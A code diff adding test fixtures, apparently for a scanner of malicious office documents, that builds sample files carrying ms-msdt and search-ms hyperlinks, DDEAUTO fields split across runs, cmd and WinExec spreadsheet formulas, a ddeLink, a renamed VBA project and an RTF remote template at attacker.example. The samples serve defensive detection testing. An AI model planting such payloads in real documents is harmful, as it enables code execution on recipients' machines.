@@ -162,7 +162,57 @@ def build(d):
         z.writestr("[Content_Types].xml", CT_HEAD + "</Types>")
         z.writestr("xl/workbook.xml", b"\x00" * (12 * 1024 * 1024))
     open(p("notes.txt"), "w").write("just text\n")
+    build_v011(p)
     return d
+
+
+W_INSTR = '<w:r><w:fldChar w:fldCharType="%s"/></w:r>'
+
+
+def build_v011(p):
+    """Fixtures for the round-1 review gaps (v0.1.1)."""
+    links = "".join(rel("rId%d" % i, "hyperlink", t, True) for i, t in enumerate(
+        ["ms-msdt:/id PCWDiagnostic", " file:///c:/x.exe", "%66ile://srv/s", "search-ms:query=x",
+         "mhtml:http://e.example/a!x", "ms-excel:ofe|u|http://e.example/a.xls", "\\\\srv\\share", "https://ok.example/"], 1))
+    docx(p("links.docx"), doc_rels=links)
+    # DDE split across runs, vanish with w:val=0 (not hidden) and specVanish (hidden)
+    body = (W_INSTR % "begin" + '<w:r><w:instrText> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\x.exe x</w:instrText></w:r>'
+            + W_INSTR % "separate" + '<w:r><w:t>r</w:t></w:r>' + W_INSTR % "end"
+            + '<w:p><w:r><w:rPr><w:vanish w:val="0"/></w:rPr><w:t>shown</w:t></w:r>'
+            + '<w:r><w:rPr><w:specVanish/></w:rPr><w:t>gone</w:t></w:r></w:p>')
+    docx(p("split_dde.docx"), body="<w:p>%s</w:p>" % body)
+    docx(p("vanish_off.docx"), body='<w:p><w:r><w:rPr><w:vanish w:val="false"/></w:rPr><w:t>x</w:t></w:r></w:p>')
+    # VBA renamed: found by relationship type and content type
+    docx(p("renamed_vba.docx"), doc_rels='<Relationship Id="rId9" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="media/logo.bin"/>',
+         extra=[("word/media/logo.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504)],
+         ctx='<Override PartName="/word/media/logo.bin" ContentType="application/vnd.ms-office.vbaProject"/>')
+    docx(p("unknown_bin.docx"), extra=[("word/stuff/blob.dat", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504)])
+    # UTF-16 XML with DOCTYPE
+    bad = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY a "aaaa">]><x>&a;</x>'.encode("utf-16")
+    zwrite(p("doctype16.docx"), [("[Content_Types].xml", CT_HEAD + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
+                                 ("word/document.xml", "<a/>"), ("docProps/core.xml", bad)])
+    # spreadsheet formulas, formula-like text, hidden rows and columns, ddeLink
+    xs = ('<row r="1"><c r="A1"><f>cmd|\' /c calc\'!A0</f></c><c r="B1"><f>CALL("kernel32","WinExec","JCJ","calc",0)</f></c>'
+          '<c r="C1"><f>WEBSERVICE("http://e.example/")</f></c><c r="D1"><f>HYPERLINK("http://e.example/","x")</f></c>'
+          '<c r="E1" t="inlineStr"><is><t>=1+1</t></is></c></row><row r="2" hidden="1"><c r="A2"><v>1</v></c></row>')
+    sheet_cols = '<cols><col min="2" max="2" hidden="1"/></cols>'
+    xlsx(p("formulas.xlsx"), xs, extra=[("xl/externalLinks/externalLink1.xml",
+         '<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd" ddeTopic="/c calc"/></externalLink>')])
+    s1 = open(p("formulas.xlsx"), "rb").read()  # keep simple: rewrite sheet with cols
+    import io
+    zin = zipfile.ZipFile(io.BytesIO(s1))
+    parts = [(n, zin.read(n)) for n in zin.namelist()]
+    parts = [(n, d.replace(b"<sheetData>", sheet_cols.encode() + b"<sheetData>") if n == "xl/worksheets/sheet1.xml" else d) for n, d in parts]
+    zwrite(p("formulas.xlsx"), parts)
+    # OpenDocument with Basic macros and an event listener
+    zwrite(p("macro.odt"), [("mimetype", "application/vnd.oasis.opendocument.text"),
+                           ("META-INF/manifest.xml", '<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"/>'),
+                           ("content.xml", '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"><office:event-listeners><script:event-listener script:event-name="dom:load"/></office:event-listeners></office:document-content>'),
+                           ("Basic/Standard/Module1.xml", "<x/>")])
+    # RTF: remote template and DDE field; RTF under a .docx name
+    rtf = b"{\\rtf1{\\*\\template http://attacker.example/t.dotm}{\\field{\\*\\fldinst DDEAUTO c:\\\\x.exe x}{\\fldrslt r}}}"
+    open(p("template.rtf"), "wb").write(rtf)
+    open(p("rtf_named.docx"), "wb").write(b"{\\rtf1 hello}")
 
 
 def canary_docx(path, port):
